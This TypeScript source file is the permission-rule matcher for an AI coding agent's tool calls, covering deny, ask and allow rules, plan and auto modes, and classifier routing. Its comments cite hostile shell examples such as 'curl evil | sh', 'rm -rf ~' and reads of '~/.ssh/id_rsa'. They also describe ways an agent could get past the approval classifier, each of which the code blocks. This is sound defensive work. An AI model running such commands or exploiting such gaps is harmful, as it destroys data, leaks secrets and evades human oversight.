/**
 * Claude Code permission-rule matching (pure).
 *
 * Rules use Claude Code's settings.json syntax: a bare tool name ("Bash") or
 * "Tool(pattern)" ("Bash(npm run test:*)", "Edit(docs/**)"). Claude Code
 * PascalCase tool names are mapped to this package's pi tool names so users'
 * existing ~/.claude/settings.json files work unchanged.
 */

import { homedir } from "node:os";
import { isAbsolute, relative, resolve, sep } from "node:path";
import { analyzeShellCommand, hasInjectionSyntax, parseCommand } from "../auto-mode/shell-analysis.ts";
import { isProtectedPath, isWritingTool } from "./protected-paths.ts";
import { expandTilde } from "../lib/paths.ts";

export type PermissionMode = "default" | "acceptEdits" | "plan" | "bypassPermissions" | "dontAsk" | "auto";
/** "classify" is auto mode's outcome: hand the call to the approval classifier. */
export type PermissionDecision = "allow" | "deny" | "ask" | "classify";

/** Claude Code tool name (lowercased) → One Code tool name. */
const CC_TOOL_NAMES: Record<string, string> = {
	bash: "bash",
	read: "read",
	edit: "edit",
	write: "write",
	grep: "grep",
	glob: "find",
	find: "find",
	ls: "ls",
	notebookedit: "notebook_edit",
	notebook_edit: "notebook_edit",
	webfetch: "web_fetch",
	web_fetch: "web_fetch",
	websearch: "web_search",
	web_search: "web_search",
	task: "Agent",
	agent: "Agent",
	subagent: "Agent", // pre-rename internal name, so old permission rules still match
	skill: "skill",
	askuserquestion: "ask_user_question",
	ask_user_question: "ask_user_question",
	workflow: "workflow",
	taskcreate: "task_create",
	taskget: "task_get",
	tasklist: "task_list",
	taskupdate: "task_update",
	taskoutput: "task_output",
	taskstop: "task_stop",
	monitor: "monitor",
	schedulewakeup: "schedule_wakeup",
	sendmessage: "SendMessage",
	send_message: "SendMessage", // pre-rename internal name
	listagents: "list_agents",
	list_agents: "list_agents",
	enterworktree: "enter_worktree",
	exitworktree: "exit_worktree",
	listmcpresourcestool: "list_mcp_resources",
	readmcpresourcetool: "read_mcp_resource",
	readmcpresourcedirtool: "read_mcp_resource_dir",
};

export function normalizeToolName(name: string): string {
	if (name.startsWith("mcp__")) return name;
	const lower = name.toLowerCase();
	return CC_TOOL_NAMES[lower] ?? lower;
}

/**
 * Every Claude Code-style spelling that maps to this One Code tool name — the
 * inverse of CC_TOOL_NAMES, used by extensions/hooks to test CC hook matchers
 * ("Glob", "Task", …) against One Code tool names. Extending CC_TOOL_NAMES for
 * a new tool keeps hook matching current automatically.
 */
export function ccAliasesForTool(nativeName: string): string[] {
	return Object.entries(CC_TOOL_NAMES)
		.filter(([, mapped]) => mapped === nativeName)
		.map(([alias]) => alias);
}

export interface PermissionRule {
	raw: string;
	tool: string;
	pattern?: string;
}

/**
 * Parse "Tool" or "Tool(pattern)". Returns undefined for malformed rules. Tool
 * names may carry `-` and `.` — MCP tools keep their servers' hyphens
 * (`mcp__github__delete-repo`), and a rule naming one used to be dropped
 * silently (review P5).
 */
export function parseRule(raw: string): PermissionRule | undefined {
	const trimmed = raw.trim();
	if (!trimmed) return undefined;
	const match = trimmed.match(/^([A-Za-z0-9_.-]+)(?:\((.*)\))?$/s);
	if (!match) return undefined;
	const [, name, pattern] = match;
	return { raw: trimmed, tool: normalizeToolName(name), pattern: pattern || undefined };
}

/** Parsed rules plus the raw strings that could not be parsed, so a caller can report them. */
export function parseRulesReport(raws: string[]): { rules: PermissionRule[]; dropped: string[] } {
	const rules: PermissionRule[] = [];
	const dropped: string[] = [];
	for (const raw of raws) {
		const rule = parseRule(raw);
		if (rule) rules.push(rule);
		else if (raw.trim()) dropped.push(raw.trim());
	}
	return { rules, dropped };
}

export function parseRules(raws: string[]): PermissionRule[] {
	return parseRulesReport(raws).rules;
}

/**
 * Whether a bash pattern has a `*` that is a wildcard — i.e. not written `\*`.
 * Claude Code's escape syntax: `\*` is a literal asterisk, `\\` a literal
 * backslash. A pattern with no unescaped `*` is an exact command.
 */
export function hasUnescapedWildcard(pattern: string): boolean {
	for (let i = 0; i < pattern.length; i++) {
		if (pattern[i] === "\\") {
			i++;
			continue;
		}
		if (pattern[i] === "*") return true;
	}
	return false;
}

/** The literal command an exact (wildcard-free) bash pattern stands for. */
export function unescapeLiteral(pattern: string): string {
	return pattern.replace(/\\([*\\])/g, "$1");
}

/**
 * Spell a literal command as a bash pattern that matches exactly it — `*` and
 * `\` escaped — for rules minted from an approved command ("don't ask again
 * this session"). Without this `ls *.ts` became a glob matching
 * `ls ; rm -rf ~ #.ts` (review P7).
 */
export function escapeLiteral(command: string): string {
	return command.replace(/[\\*]/g, (ch) => `\\${ch}`);
}

/** Glob → RegExp. `**` crosses path separators, `*` does not. `\*` / `\\` are literals. */
function globToRegex(glob: string, pathMode: boolean): RegExp {
	let out = "";
	for (let i = 0; i < glob.length; i++) {
		const ch = glob[i];
		if (ch === "\\" && (glob[i + 1] === "*" || glob[i + 1] === "\\")) {
			out += `\\${glob[i + 1]}`;
			i++;
		} else if (ch === "*") {
			if (pathMode && glob[i + 1] === "*") {
				out += ".*";
				i++;
				if (glob[i + 1] === "/") i++; // "**/" also matches zero directories
			} else {
				out += pathMode ? "[^/]*" : ".*";
			}
		} else if ("\\^$.|?+()[]{}".includes(ch)) {
			out += `\\${ch}`;
		} else {
			out += ch;
		}
	}
	return new RegExp(`^${out}$`);
}

/**
 * Bash pattern match against ONE command (no `&&`/`|`/`;`), Claude Code
 * semantics (`utils/permissions/shellRuleMatching.ts` + `bashPermissions.ts`):
 * - exact rule: the whole command, character for character;
 * - prefix rule `npm test:*`: the command IS `npm test` or starts with
 *   `npm test ` — the boundary is a literal space, so `git:*` does not cover
 *   `gitk` (and, as in CC, `npm run test:*` does not cover `npm run test:unit`;
 *   write `npm run test:unit:*` or `npm run test*` for that). The bare
 *   `xargs <prefix>` spelling counts too, so `Bash(rm:*)` as a deny still
 *   catches `xargs rm`;
 * - wildcard rule (`*` anywhere else): `*` matches any run of characters; a
 *   single trailing ` *` also matches the bare command (`git *` covers `git`).
 * Compound commands are handled by the callers: {@link ruleMatches} (deny/ask
 * — any subcommand) and {@link findBashAllowRule} (allow — every subcommand).
 */
export function matchesBashPattern(pattern: string, command: string): boolean {
	const cmd = command.trim();
	if (pattern.endsWith(":*")) {
		const prefix = pattern.slice(0, -2);
		if (cmd === prefix || cmd.startsWith(`${prefix} `)) return true;
		const viaXargs = `xargs ${prefix}`;
		return cmd === viaXargs || cmd.startsWith(`${viaXargs} `);
	}
	if (hasUnescapedWildcard(pattern)) {
		let regex = globToRegex(pattern, false);
		const stars = pattern.split("*").length - 1;
		if (stars === 1 && pattern.endsWith(" *")) {
			const source = regex.source.slice(0, -" .*$".length);
			regex = new RegExp(`${source}( .*)?$`);
		}
		return regex.test(cmd);
	}
	return cmd === unescapeLiteral(pattern);
}

/**
 * The separately-executing subcommands of a bash command line — what `&&`,
 * `||`, `;`, `|`, `&`, and unquoted newlines separate — or undefined when the
 * line cannot be parsed (unbalanced quotes). A single simple command comes
 * back as itself.
 */
export function bashSubcommands(command: string): string[] | undefined {
	const { segments, parseFailed } = parseCommand(command.trim());
	if (parseFailed) return undefined;
	return segments.map((seg) => seg.raw).filter((raw) => raw.length > 0);
}

/**
 * A bash deny/ask rule matches when its pattern covers the WHOLE command or
 * ANY subcommand of it — wrapping `rm -rf x` in `ls && rm -rf x` must not slip
 * past `Bash(rm:*)` (CC: "deny/ask rules must match compound commands so they
 * can't be bypassed"). Unparseable lines are matched as a whole only.
 */
function bashPatternMatchesAny(pattern: string, command: string): boolean {
	if (matchesBashPattern(pattern, command)) return true;
	const subs = bashSubcommands(command);
	if (!subs || subs.length < 2) return false;
	return subs.some((sub) => matchesBashPattern(pattern, sub));
}

/**
 * The allow rule that lets a bash command run, or undefined. CC semantics: an
 * EXACT rule equal to the whole command allows it outright (the user approved
 * that literal string); otherwise the command is split into subcommands and
 * every one of them must be covered by some allow rule — `Bash(npm test:*)`
 * alone never covers `npm test && curl evil | sh`, while `Bash(npm test:*)` +
 * `Bash(git status:*)` together cover `npm test && git status`. Prefix and
 * wildcard rules never cover a command carrying command substitution, process
 * substitution, eval/exec, a pipe into an interpreter, or a base64 decode:
 * what runs is not what the words say, so the rule's author never saw it. An
 * unparseable line is not covered. The rule returned is the first one that
 * covered a subcommand (for the "allowed by rule …" note).
 */
export function findBashAllowRule(rules: PermissionRule[], command: string): PermissionRule | undefined {
	const cmd = command.trim();
	if (!cmd) return undefined;
	const bashRules = rules.filter((r) => r.tool === "bash");
	const bare = bashRules.find((r) => !r.pattern);
	if (bare) return bare;
	const exact = bashRules.find(
		(r) => r.pattern !== undefined && !hasUnescapedWildcard(r.pattern) && unescapeLiteral(r.pattern) === cmd,
	);
	if (exact) return exact;
	if (hasInjectionSyntax(cmd)) return undefined;
	const subs = bashSubcommands(cmd);
	if (!subs || subs.length === 0) return undefined;
	let first: PermissionRule | undefined;
	for (const sub of subs) {
		const rule = bashRules.find((r) => r.pattern !== undefined && matchesBashPattern(r.pattern, sub));
		if (!rule) return undefined;
		first ??= rule;
	}
	return first;
}

/**
 * Path pattern match against the RESOLVED forms of the subject — absolute
 * (with `.`/`..` normalised), cwd-relative, and `~/`-relative — never the raw
 * spelling: `Edit(docs/**)` must not match `docs/../src/main.ts`, and a
 * `~/.ssh/id_rsa` subject must hit `Read(~/.ssh/**)` (review P6).
 */
export function matchesPathPattern(pattern: string, subject: string, cwd: string): boolean {
	const home = homedir();
	const expandedPattern = expandTilde(pattern, home);
	const expandedSubject = expandTilde(subject, home);

	const candidates = new Set<string>();
	const absolute = isAbsolute(expandedSubject) ? resolve(expandedSubject) : resolve(cwd, expandedSubject);
	candidates.add(absolute);
	const rel = relative(cwd, absolute);
	if (rel && !rel.startsWith("..")) candidates.add(rel);
	if (absolute.startsWith(`${home}/`)) candidates.add(`~/${absolute.slice(home.length + 1)}`);

	const regex = globToRegex(expandedPattern, true);
	for (const candidate of candidates) {
		if (regex.test(candidate)) return true;
	}
	return false;
}

/** The argument a rule pattern applies to, per tool. */
export function extractSubject(toolName: string, input: Record<string, unknown>): string {
	if (toolName === "bash") return typeof input.command === "string" ? input.command : "";
	const path = input.path ?? input.file_path;
	return typeof path === "string" ? path : "";
}

/**
 * Whether `candidate` names plan mode's one writable file, after ~-expansion
 * and cwd resolution of both sides. Compared case-folded: the resolved subject
 * arrives case-folded from `resolveForContainment`, and without folding that
 * branch of the check could never match on macOS.
 */
/** Expand a leading `~/`, resolve against cwd, and case-fold — the same shape
 * `resolveForContainment` folds its output to, so a subject compared here matches. */
function toAbsoluteFolded(p: string, cwd: string): string {
	return resolve(cwd, expandTilde(p, homedir())).toLowerCase();
}

function isPlanFilePath(candidate: string, planFilePath: string, cwd: string): boolean {
	return toAbsoluteFolded(candidate, cwd) === toAbsoluteFolded(planFilePath, cwd);
}

/**
 * Whether `candidate` lands *inside* `dir` (a harness-designated session
 * directory: the auto-memory dir, the scratchpad). `resolve()` normalizes
 * `..` segments first, so a traversal spelled through the dir does not clear.
 * Compared case-folded, like isProtectedPath: the resolved subject arrives
 * case-folded from `resolveForContainment`.
 */
export function isInsideDir(candidate: string, dir: string, cwd: string): boolean {
	return toAbsoluteFolded(candidate, cwd).startsWith(toAbsoluteFolded(dir, cwd) + sep);
}

/**
 * Whether one rule matches a call. For bash this is the deny/ask ("any
 * subcommand") semantics — allow rules go through {@link findBashAllowRule}.
 */
export function ruleMatches(rule: PermissionRule, toolName: string, subject: string, cwd: string): boolean {
	if (rule.tool !== normalizeToolName(toolName)) return false;
	if (!rule.pattern) return true;
	if (!subject) return false;
	if (rule.tool === "bash") return bashPatternMatchesAny(rule.pattern, subject);
	return matchesPathPattern(rule.pattern, subject, cwd);
}

/** Risk tier drives the unmatched-rule default. */
export type ToolTier = "safe" | "edit" | "execute" | "custom";

const SAFE_TOOLS = new Set(["read", "grep", "find", "ls"]);
const EDIT_TOOLS = new Set(["edit", "write", "notebook_edit"]);

export function toolTier(toolName: string): ToolTier {
	const name = normalizeToolName(toolName);
	if (SAFE_TOOLS.has(name)) return "safe";
	if (EDIT_TOOLS.has(name)) return "edit";
	if (name === "bash") return "execute";
	return "custom";
}

/**
 * Tools that never need approval: they change no state outside the session and
 * touch no network or filesystem the user hasn't already opted into.
 *
 * `tool_search` and `skill` matter more than they look — gating them breaks
 * deferred tool loading and skill invocation entirely in non-interactive runs,
 * since a blocked loader means the model can never reach the tools behind it.
 */
export const AUTO_ALLOWED_TOOLS = new Set<string>([
	"ask_user_question",
	"ask_user",
	// Loads tool schemas and packaged instructions; no side effects.
	"tool_search",
	"skill",
	// Read-only inspection.
	"lsp_diagnostics",
	"list_mcp_resources",
	"list_agents",
	// Subagent orchestration is safe to launch; each child enforces its own
	// tool permissions via the in-process permission gate.
	"Agent",
	// Same reasoning for workflow: the script itself cannot touch the
	// filesystem, network, or shell — only spawn agents, and every one of those
	// runs behind the workflow permission gate.
	"workflow",
	// Plan-mode transitions must work inside plan mode itself.
	"enter_plan_mode",
	"exit_plan_mode",
	// Session-state bookkeeping.
	"task_create",
	"task_get",
	"task_list",
	"task_update",
	// Inspecting/stopping background work this session already started.
	"task_output",
	"task_stop",
	// A timer that replays a prompt; no side effects outside the session.
	"schedule_wakeup",
	// Resumes/messages an agent — same reasoning as Agent: the child enforces its
	// own tool permissions. (monitor and enter/exit_worktree stay gated: they
	// run arbitrary shell commands / mutate the filesystem.)
	"SendMessage",
]);

export interface DecideInput {
	toolName: string;
	subject: string;
	cwd: string;
	mode: PermissionMode;
	deny: PermissionRule[];
	ask: PermissionRule[];
	allow: PermissionRule[];
	/** Auto mode: route every shell command through the classifier, ignoring narrow Bash allow rules. */
	classifyAllShell?: boolean;
	/**
	 * The subject with symlinks resolved (see auto-mode/paths.ts), when the
	 * caller could resolve it. The protected-path check consults it as well as
	 * the literal spelling, so writing through `ln -s .git/hooks build` is as
	 * protected as writing `.git/hooks` directly. Kept a separate input so this
	 * module stays pure — resolution touches the filesystem.
	 */
	resolvedSubject?: string;
	/**
	 * Plan mode's one writable file (see extensions/plan-mode). Absolute or
	 * ~-prefixed; writes whose subject resolves to it are allowed even in plan
	 * mode.
	 */
	planFilePath?: string;
	/**
	 * The session's auto-memory directory (see extensions/memory). Absolute or
	 * ~-prefixed; writes landing inside it are allowed — the system prompt
	 * itself instructs them — though deny and ask rules still win.
	 */
	memoryDirPath?: string;
	/**
	 * The session's scratchpad directory (see extensions/lib/scratchpad); the
	 * system prompt directs all temp files there, with the same treatment as
	 * the memory dir.
	 */
	scratchpadDirPath?: string;
}

export interface Decision {
	decision: PermissionDecision;
	/** Rule that determined the outcome, when one did. */
	rule?: PermissionRule;
	/** Why, for deny/ask decisions surfaced to the model or user. */
	cause:
		| "rule"
		| "plan-mode"
		| "plan-file"
		| "plan-readonly"
		| "memory-dir"
		| "scratchpad-dir"
		| "mode"
		| "tier"
		| "protected-path";
}

/**
 * Custom-tier tools that only read (the network or MCP resources) and so stay
 * available in plan mode, as WebFetch/WebSearch do in Claude Code. Everything
 * else custom is treated as a mutation there.
 */
const PLAN_READ_ONLY_TOOLS = new Set(["web_fetch", "web_search", "list_mcp_resources", "read_mcp_resource", "read_mcp_resource_dir"]);

/**
 * Tools that launch a fresh agent loop. In auto mode these are classified
 * rather than auto-allowed, so the delegated task is judged before the child
 * starts — a child cannot be trusted to refuse a task its parent should not have
 * handed it, and Claude Code evaluates the task description at spawn time for
 * the same reason. Outside auto mode they stay auto-allowed: each child enforces
 * its own permissions by inheriting the mode.
 */
const DELEGATION_TOOLS = new Set(["Agent", "workflow"]);

/**
 * Interpreters and runners whose arguments are code, so a wildcarded rule over
 * them (`Bash(python*)`, `Bash(npm run *)`) grants arbitrary execution just as
 * surely as `Bash(*)` does.
 */
const INTERPRETERS_AND_RUNNERS =
	/^(python[0-9.]*|python3|node|deno|bun|ruby|perl|php|osascript|bash|sh|zsh|fish|pwsh|powershell|eval|exec|env|xargs|nohup|setsid|timeout|make|npx|pnpx|yarn|npm|pnpm|bunx|uv|uvx|pip[0-9]*|poetry|cargo|go|dotnet|java|mvn|gradle|docker|kubectl|ssh)\b/;

/**
 * An allow rule broad enough to grant arbitrary code execution. Auto mode
 * suspends these — a blanket `Bash` or a wildcarded interpreter would otherwise
 * hand the model a standing way past the classifier, which is the one thing auto
 * mode exists to prevent. Narrow rules (`Bash(npm test:*)`) still resolve before
 * the classifier unless `classifyAllShell` is set.
 *
 * Matches Claude Code's list: blanket `Bash(*)`/`PowerShell(*)`, wildcarded
 * interpreters, package-manager run commands, and `Agent`/`Task` rules.
 */
export function isBroadExecutionRule(rule: PermissionRule): boolean {
	// Delegation rules are dropped outright: a subagent is a fresh agent loop, so
	// pre-approving one pre-approves whatever that loop decides to do.
	if (rule.tool === "Agent" || rule.tool === "workflow") return true;
	if (rule.tool !== "bash") return false;

	if (!rule.pattern) return true;
	const pattern = rule.pattern.trim().toLowerCase();
	// Without a wildcard the rule matches one exact command, which is narrow by
	// construction however powerful that command is — `Bash(python)` only ever
	// starts a bare REPL.
	if (!hasUnescapedWildcard(pattern)) return false;
	if (/^(\*|:\*|\*\*)$/.test(pattern)) return true;

	const head = pattern.split(/[\s*]/)[0] ?? "";
	if (!INTERPRETERS_AND_RUNNERS.test(head)) return false;

	const rest = pattern.slice(head.length).trim();
	// Nothing constrains the arguments: `python*`, `node *`, `npm *`.
	if (/^[:\s]*\*+$/.test(rest)) return true;
	// The runner's own escape hatch takes arbitrary code: `npm run *`, `npx *`.
	if (/^(run|exec|x)[:\s]*\*+$/.test(rest)) return true;
	// Interpreter inline-code flags take arbitrary code: `python -c *`, `node -e *`,
	// `sh -c *`, `bash -c *`, `ruby -e *`. Quote-wrapped spellings count too —
	// `python3 -c '*` / `-c ' *` (as real settings write them) hand over exactly
	// the same arbitrary code slot. Without this, such a rule granted a standing
	// bypass of the classifier (over-flagging a runner's `-c` here only costs a
	// classifier call, which is the safe direction).
	if (/^-(c|e)[\s:='"]*\*+['"]*$/.test(rest)) return true;
	// `npm test:*` names the script, so it stays narrow.
	return false;
}

export function decide(params: DecideInput): Decision {
	const { toolName, subject, cwd, mode, deny, ask, allow } = params;

	// In dontAsk mode anything that would prompt is denied instead — including
	// explicit ask rules: there is no user to put the question to.
	const askOrDeny = (rule?: PermissionRule): Decision => {
		if (mode === "dontAsk") return { decision: "deny", rule, cause: "mode" };
		return { decision: "ask", rule, cause: rule ? "rule" : "tier" };
	};

	const denyRule = deny.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (denyRule) return { decision: "deny", rule: denyRule, cause: "rule" };

	if (mode === "bypassPermissions") return { decision: "allow", cause: "mode" };

	const tier = toolTier(toolName);
	const tool = normalizeToolName(toolName);
	if (mode === "plan" && tier !== "safe" && !AUTO_ALLOWED_TOOLS.has(normalizeToolName(toolName))) {
		// Plan mode's one writable file (~/.onecode/plans/<slug>.md, which
		// protected-paths already excepts as working space).
		const planFile = params.planFilePath;
		if (planFile && isWritingTool(normalizeToolName(toolName)) && subject) {
			const planTarget =
				isPlanFilePath(subject, planFile, cwd) ||
				(params.resolvedSubject ? isPlanFilePath(params.resolvedSubject, planFile, cwd) : false);
			if (planTarget) return { decision: "allow", cause: "plan-file" };
		}
		// Read-only bash stays usable while planning (Claude Code permits it). The
		// auto-mode shell pre-gate's "safe" verdict means "every command is on the
		// read-only allowlist, nothing leaves the project" — plus in-project
		// redirect writes, which it records; a safe verdict with no writes is
		// exactly read-only. Anything it cannot vouch for is denied as before.
		// Without this the frontier tier (no grep/find/ls) was left with `read` alone.
		if (tool === "bash" && subject) {
			const evidence = analyzeShellCommand({ command: subject, cwd, home: homedir() });
			if (evidence.verdict === "safe" && evidence.writes.length === 0) return { decision: "allow", cause: "plan-readonly" };
		}
		if (PLAN_READ_ONLY_TOOLS.has(tool)) return { decision: "allow", cause: "plan-readonly" };
		return { decision: "deny", cause: "plan-mode" };
	}

	// An explicit ask rule is the user's stated intent to be prompted, so it wins
	// over auto mode too: the classifier never gets to auto-approve a match.
	const askRule = ask.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (askRule) return askOrDeny(askRule);

	/**
	 * The session's own auto-memory and scratchpad directories are
	 * harness-designated working space, like plan mode's plan file: the system
	 * prompt instructs the model to write memories and temp files there, so
	 * gating those writes (outside-cwd, and for memory under the protected
	 * `.claude` dir) makes the harness block its own feature — auto mode's
	 * classifier was correctly flagging them as out-of-project writes. This
	 * clears *only* the exact per-session dirs passed in; any other path under
	 * `.claude` or `/tmp` gets no special treatment. The resolved form is
	 * where the write actually lands, so it is the one judged — a symlink
	 * planted inside a session dir must not turn this into an allow for
	 * wherever it points.
	 */
	if (isWritingTool(normalizeToolName(toolName)) && subject) {
		const target = params.resolvedSubject ?? subject;
		for (const { dir, cause } of [
			{ dir: params.memoryDirPath, cause: "memory-dir" as const },
			{ dir: params.scratchpadDirPath, cause: "scratchpad-dir" as const },
		]) {
			if (dir && isInsideDir(target, dir, cwd)) return { decision: "allow", cause };
		}
	}

	// Protected-path writes are checked *before* allow rules, so an
	// `Edit(.claude/**)` entry cannot pre-approve reconfiguring the agent's own
	// permissions or planting a git hook. In auto mode they go to the classifier.
	const protectedTarget = () =>
		isProtectedPath(subject, cwd) || (params.resolvedSubject ? isProtectedPath(params.resolvedSubject, cwd) : false);
	if (isWritingTool(tool) && subject && protectedTarget()) {
		if (mode === "dontAsk") return { decision: "deny", cause: "protected-path" };
		if (mode === "auto") return { decision: "classify", cause: "protected-path" };
		return { decision: "ask", cause: "protected-path" };
	}

	const usableAllow =
		mode === "auto"
			? allow.filter((rule) => {
					if (isBroadExecutionRule(rule)) return false;
					if (params.classifyAllShell && rule.tool === "bash") return false;
					return true;
				})
			: allow;
	// Bash allow rules must cover EVERY subcommand of a compound line (CC
	// semantics); a deny/ask rule above fired on ANY subcommand.
	const allowRule =
		tool === "bash"
			? subject
				? findBashAllowRule(usableAllow, subject)
				: undefined
			: usableAllow.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (allowRule) return { decision: "allow", rule: allowRule, cause: "rule" };

	if (mode === "auto" && DELEGATION_TOOLS.has(tool)) {
		return { decision: "classify", cause: "mode" };
	}

	if (tier === "safe" || AUTO_ALLOWED_TOOLS.has(tool)) {
		return { decision: "allow", cause: "tier" };
	}
	if (tier === "edit" && mode === "acceptEdits") return { decision: "allow", cause: "mode" };

	// Everything left over goes to the classifier in auto mode, and to the user
	// in every other mode.
	if (mode === "auto") return { decision: "classify", cause: "mode" };

	return askOrDeny();
}
